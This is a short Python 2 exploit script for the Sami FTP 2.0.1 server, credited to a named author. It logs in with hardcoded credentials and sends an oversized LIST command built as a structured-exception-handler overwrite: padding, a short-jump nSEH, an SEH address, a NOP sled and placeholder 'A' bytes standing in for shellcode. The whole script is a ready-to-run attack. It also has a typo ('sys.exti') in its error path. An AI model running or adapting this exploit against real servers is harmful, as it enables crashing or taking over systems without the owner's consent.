#!/usr/bin/python 
import os,sys,time,socket

#---------------------------------------------------------------------------#
# 				Name:	Rio Atmadja			    #
# 			      Script: 	samiftp_2.0.1 exploit		    #
#---------------------------------------------------------------------------#

if len(sys.argv) != 2:
	print "[*] Usage: %s <ip_address> \n" % sys.argv[0]
	sys.exit(0)

target = sys.argv[1]

shellcode = '\x41' * 1523
seh = "\x80\x14\x02\x10" # 0x10021480 ( C:\Program Files\PMSystem\Temp\tmp0.dll)
nseh = "\xeb\x06\x90\x90"# jmp short 6 bytes 

payload = '\x41' * 453 + nseh + seh + '\x90' * 16 + shellcode 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d " % (target,21)
try:

	s.connect((target,21))
	s.recv(1024) 
	s.send('USER jeff\r\n')
	s.recv(1024)
	s.send('PASS 123qwe\r\n')
	s.recv(1024)
	s.send("LIST" + payload + "\r\n" )
	print "[+] Sending payload of size " + str(len(payload)) + " Bytes"
	s.close()
	print "[+] Exploit Sent Sucessfully" 

except:
	print "[-] Could not connect to " + target + ":21\r"
	sys.exti(0)








